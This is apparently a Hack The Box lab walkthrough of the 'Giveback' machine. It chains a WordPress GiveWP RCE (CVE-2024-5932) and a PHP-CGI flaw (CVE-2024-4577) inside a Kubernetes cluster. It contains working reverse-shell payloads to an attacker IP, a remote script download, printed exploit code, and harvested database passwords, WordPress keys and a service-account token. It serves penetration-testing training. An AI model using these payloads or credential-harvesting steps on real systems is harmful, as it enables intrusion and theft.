- - - 
created : 01-11-2025 

Tags : #medium 

Released on 01 Nov 2025 (Season 9)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Giveback/user]
└─$ rustscan -a giveback.htb -- -A

Open 10.10.11.94:22
Open 10.10.11.94:80
Open 10.10.11.94:30686

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 62 nginx 1.28.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
|_http-server-header: nginx/1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.8.1

30686/tcp open  http    syn-ack ttl 63 Golang net/http server
```

We have [Wordpress](../../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md).
# Enumeration
## HTTP (80)

![Pasted image 20251102182523.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251102182523.png)

`v3.14.0`

Find the portal http://giveback.htb/donations/the-things-we-need/

![Pasted image 20251102182634.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251102182634.png)
## HTTP (30686)

Use `cURL` to examine:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Giveback/user]
└─$  curl -k http://giveback.htb:30686/ --insecure
{
        "service": {
                "namespace": "default",
                "name": "wp-nginx-service"
        },
        "localEndpoints": 1,
        "serviceProxyHealthy": true
}   
```

`wp-nginx-service` is the name of the service in the default space here.
## WPScan

Run [WPScan](../../../3%20-%20Tags/Hacking%20Tools/WPScan.md) with URL flag:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Giveback/user]
└─$ wpscan --url http://giveback.htb/ -e ap --plugins-detection aggressive
```

This should find the CVE for a known plugin, which is vulnerable to Unauthenticated Remote Code Execution.
# Exploit
## CVE-2024-5932 / Unauthenticated RCE

We can find  a PoC on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):     https://github.com/EQSTLab/CVE-2024-5932

The steps are explained in **README** file

We have to use the previous found URL as target : http://giveback.htb/donations/the-things-we-need

Clone the repo, then open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and run the following command:

```bash
python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/  --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.168/1337 0>&1'"
```

If this doesn't work for you try to use a [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md) encoded payload, then check the listener for the shell:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.168] from (UNKNOWN) [10.10.11.94] 49173
bash: cannot set terminal process group (1): Inappropriate ioctl for device                            
bash: no job control in this shell                                                                     
<s-99c55546f-wpx26:/opt/bitnami/wordpress/wp-admin$ whoami                                             
whoami                                                                                                 
whoami: cannot find name for user ID 1001                                                              
<s-99c55546f-wpx26:/opt/bitnami/wordpress/wp-admin$

<s-99c55546f-wpx26:/opt/bitnami/wordpress/wp-admin$ env
env
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
KUBERNETES_SERVICE_PORT_HTTPS=443
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-99c55546f-wpx26
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/wordpress/wp-admin
OS_FLAVOUR=debian-12
WORDPRESS_SMTP_PROTOCOL=
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_DATABASE_SSL_KEY_FILE=
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_CLI_DAEMON_GROUP=daemon
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User Blog!
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
WORDPRESS_NONCE_SALT=
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WP_NGINX_SERVICE_SERVICE_PORT=80
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD= HTB{REDACTED_PASSWD}
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=HTB{REDACTED_PASSWD}
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
APACHE_SERVER_TOKENS=Prod
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
WEB_SERVER_DAEMON_USER=daemon
OS_ARCH=amd64
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```

From the `env` command:

**WORDPRESS_DATABASE_PASSWORD**=HTB{REDACTED_PASSWD}
**WORDPRESS_PASSWORD**=O8F7KRHTB{REDACTED_PASSWD}5zGi

**WORDPRESS_DATABASE_PORT_NUMBER**=3306
**WORDPRESS_DATABASE_NAME**=bitnami_wordpress

We find the passwords in the `/secrets` directory also in this `Docker` container:

```bash
I have no name!@beta-vino-wp-wordpress-99c55546f-wpx26:/$ cd secrets
cd secrets
I have no name!@beta-vino-wp-wordpress-99c55546f-wpx26:/secrets$ ls
ls
mariadb-password
mariadb-root-password
wordpress-password

<ress-99c55546f-wpx26:/secrets$ cat mariadb-password             
sW5sp4spa3u7RLyetrekE4oS

<99c55546f-wpx26:/secrets$ cat mariadb-root-password             
sW5sp4syetre32828383kE4oS

<ss-99c55546f-wpx26:/secrets$ cat wordpress-password             
O8F7KR5zGi
```

Run [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) too, use [php](../../../3%20-%20Tags/Programming%20Languages/php.md) to transfer files from your machine: 

```bash
php -r "file_put_contents('/tmp/linpeas.sh', file_get_contents('http://10.10.xx.xx/linpeas.sh'));"
```

Check results:

```bash
╔══════════╣ Analyzing Wordpress Files (limit 70)
lrwxrwxrwx 1 1001 1001 32 Nov  2 15:32 /opt/bitnami/wordpress/wp-config.php -> /bitnami/wordpress/wp-config.php                                                                                               
define( 'DB_NAME', 'bitnami_wordpress' );
define( 'DB_USER', 'bn_wordpress' );
define( 'DB_PASSWORD', 'HTB{REDACTED_PASSWD}' );
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );
        $_SERVER['HTTP_HOST'] = '127.0.0.1';
define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
```

Read the `wp-config.php` file:

```bash
<p-content$ cat /opt/bitnami/wordpress/wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'G7T{pv:!LZWUfekgP{A8TGFoL0,dMEU,&2B)ALoZS[8lo8V~+UGj@kWW%n^.vZgx' );
define( 'SECURE_AUTH_KEY',  'F3!hvuWAWvZw^$^|L]ONjyS{*xPHr(j,2$)!@t.(ZEn9NPNQ!A*6o6l}8@IN)>?>' );
define( 'LOGGED_IN_KEY',    'E5x5$T@Ggpti3+!/0G<>j<ylElF+}#Ny-7XZLw<#j[6|:oel9%OgxG|U}86./&&K' );
define( 'NONCE_KEY',        'jM^E^Bx{vf-Ca~2$eXbH%RzD?=VmxWP9Z}-}J1E@N]t`GOP`8;<F;lYmGz8sh7sG' );
define( 'AUTH_SALT',        '+L>`[0~bk-bRDX 5F?ER)PUnB_ ZWSId=J {5XV:trSTp0u!~6shvPS`VP{f(@_Q' );
define( 'SECURE_AUTH_SALT', 'RdhA5mNy%0~H%~s~S]a,G~;=n|)+~hZ/JWy*$GP%sAB-f>.;rcsO6.HXPvw@2q,]' );
define( 'LOGGED_IN_SALT',   'i?aJHLYu/rI%@MWZTw%Ch~%h|M/^Wum4$#4;qm(#zgQA+X3gKU?~B)@Mbgy %k}G' );
define( 'NONCE_SALT',       'Y!dylf@|OTpnNI+fC~yFTq@<}$rN)^>=+e}Q~*ez?1dnb8kF8@_{QFy^n;)gk&#q' );

/**#@-*/

/**
 * WordPress database table prefix.
<SNIP>
```

Now we can use this credentials to access the database from the `bitnami` shell:

```bash
<-wordpress-99c55546f-wpx26:/opt/bitnami/mysql/bin$ ls
ls
mariadb
mariadb-dump
mysql
mysqldump

<wordpress-85cff6d4f8-d5xvb:/opt/bitnami/mysql/bin$ /opt/bitnami/mysql/bin/mariadb-dump
<nami/mysql/bin$ /opt/bitnami/mysql/bin/mariadb-dump
Usage: mariadb-dump [OPTIONS] database [tables]
OR     mariadb-dump [OPTIONS] --databases DB1 [DB2 DB3...]
OR     mariadb-dump [OPTIONS] --all-databases
OR     mariadb-dump [OPTIONS] --system=[SYSTEMOPTIONS]]
For more options, use mariadb-dump --help


I have no name!@beta-vino-wp-wordpress-85cff6d4f8-d5xvb:/$ /opt/bitnami/mysql/bin/mariadb-dump -h 10.43.147.82 -P 3306 -u bn_wordpress -p bitnami_wordpress > /tmp/bitnami_wordpress.sql

<s -p bitnami_wordpress > /tmp/bitnami_wordpress.sql       
Enter password: HTB{REDACTED_PASSWD}

I have no name!@beta-vino-wp-wordpress-85cff6d4f8-d5xvb:/$ cat /tmp/bitnami_wordpress.sql
<-85cff6d4f8-d5xvb:/$ cat /tmp/bitnami_wordpress.sql       
/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19-11.4.7-MariaDB, for Linux (x86_64)
--
-- Host: 10.43.147.82    Database: bitnami_wordpress
-- ------------------------------------------------------
-- Server version       11.4.3-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

<SNIP>

-- Dumping data for table `wp_users`
--

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES
(1,'user','$P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP.','user','user@example.com','http://127.0.0.1','2024-09-21 22:18:28','',0,'HTB{REDACTED_PASSWD}'),
(2,'iamnoob','$wp$2y$10$k3qT8hkbblSPK8WMVzT45.yOa12fai6MgMuWry34JnVvtAHrDIFMG','iamnoob','iamnoob@giveback.htb','','2025-11-03 10:57:29','',0,'HTB{REDACTED_PASSWD}');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*M!100616 SET NOTE_VERBOSITY=@OLD_NOTE_VERBOSITY */;
```

We find:

	user: $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP. | `HTB{REDACTED_PASSWD}`

Cracking this hash won't work, and it's not needed. We have a useful username.
## Docker escape - Pivoting

If we look at the `env` results again we can find the network `kubernetes` is using:

```bash
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
```

Enumeration of the network **Cache ARP**:

```bash
I have no name!@beta-vino-wp-wordpress-6f96685b7d-nb7cw:/opt/bitnami$ cat /proc/net/arp
<ss-6f96685b7d-nb7cw:/opt/bitnami$ cat /proc/net/arp                  
IP address       HW type     Flags       HW address            Mask     Device
10.42.1.170      0x1         0x2         ae:e6:0f:3f:ff:8f     *        eth0
10.42.1.171      0x1         0x2         da:33:a4:a0:69:85     *        eth0
10.42.1.1        0x1         0x2         52:4d:d4:cc:70:1f     *        eth0
10.42.1.172      0x1         0x2         66:76:76:b6:91:77     *        eth0
10.42.1.174      0x1         0x2         e6:64:63:6f:7d:55     *        eth0
10.42.1.182      0x1         0x2         ca:dc:c5:15:6a:6c     *        eth0
10.42.1.168      0x1         0x2         fe:2d:f0:e0:be:c1     *        eth0
10.42.1.176      0x1         0x2         76:39:88:ce:6e:ea     *        eth0
10.42.1.177      0x1         0x2         fe:b4:2e:3d:49:d7     *        eth0
```

And routing destinations:

```bash
I have no name!@beta-vino-wp-wordpress-6f96685b7d-nb7cw:/opt/bitnami$ awk '/32 host/ { print f } {f=$2}' <<< "$(</proc/net/fib_trie)" | sort -u
< f } {f=$2}' <<< "$(</proc/net/fib_trie)" | sort -u                  
10.42.1.181
127.0.0.1
```

**10.42.1.181** is the current container IP address, then we have the `loopback`.
## CVE-2024-4577

After some more enumeration on the service, we found an applicable CVE:

https://github.com/watchtowrlabs/CVE-2024-4577

```python
└─$ cat CVE-2024-4577.py 
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```

This PoC script is not ideal for our purposes, open a listener and run this `php` command on the container for another direct [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md):

```bash
php -r '$p="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.168 4444 > /tmp/f"; $o = ["http"=>["method"=>"POST", "header"=>"Content-Type: application/x-www-form-urlencoded","content"=>$p,"timeout"=>4]]; $c=stream_context_create($o); $r=@file_get_contents("http://legacy-intranet-service:5000/cgi-bin/php-cgi?--define+allow_url_include%3don+--define+auto_prepend_file%3dphp://input",false,$c); echo $r===false?"":substr($r,0,5000);'
```

Check listener:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Giveback/user]
└─$ nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.10.14.168] from (UNKNOWN) [10.10.11.94] 34697
sh: cant access tty; job control turned off
/var/www/html/cgi-bin # whoami
root

/ # env
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=legacy-intranet-cms-6f7bf5db84-jm6bz
PHP_INI_DIR=/usr/local/etc/php
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WP_NGINX_SERVICE_SERVICE_PORT=80
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
SHLVL=4
PHP_CGI_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
HOME=/root
OLDPWD=/root
PHP_LDFLAGS=-Wl,-O1 -pie
LEGACY_CGI_ENABLED=true
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
PHP_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_MODE=enabled
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.3.tar.xz.asc
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
PHP_URL=https://www.php.net/distributions/php-8.3.3.tar.xz
PHP_MAX_EXECUTION_TIME=120
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
KUBERNETES_PORT_443_TCP_PORT=443
PHP_MEMORY_LIMIT=128M
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
KUBERNETES_PORT_443_TCP_PROTO=tcp
CMS_ENVIRONMENT=development
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
PHPIZE_DEPS=autoconf            dpkg-dev dpkg           file            g++             gcc           libc-dev                 make            pkgconf                 re2c
KUBERNETES_SERVICE_HOST=10.43.0.1
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
PWD=/
PHP_SHA256=b0a996276fe21fe9ca8f993314c8bc02750f464c7b0343f056fb0894a8dfa9d1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp

/ # hostname
legacy-intranet-cms-6f7bf5db84-lfw7l
/ # uname -a
Linux legacy-intranet-cms-6f7bf5db84-lfw7l 5.15.0-124-generic #134-Ubuntu SMP Fri Sep 27 20:20:17 UTC 2024 x86_64 Linux
```

We see an API server on `10.43.0.1:443`

Look for tokens:

```bash
/ # ls -la /var/run/secrets/kubernetes.io/serviceaccount
total 4
drwxrwxrwt    3 root     root           140 Nov  3 18:31 .
drwxr-xr-x    3 root     root          4096 Nov  3 18:17 ..
drwxr-xr-x    2 root     root           100 Nov  3 18:31 ..2025_11_03_18_31_08.342294842
lrwxrwxrwx    1 root     root            31 Nov  3 18:31 ..data -> ..2025_11_03_18_31_08.342294842
lrwxrwxrwx    1 root     root            13 Nov  3 13:38 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Nov  3 13:38 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Nov  3 13:38 token -> ..data/token

/ # cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNzMwHTB{REDACTED_HASH}
```

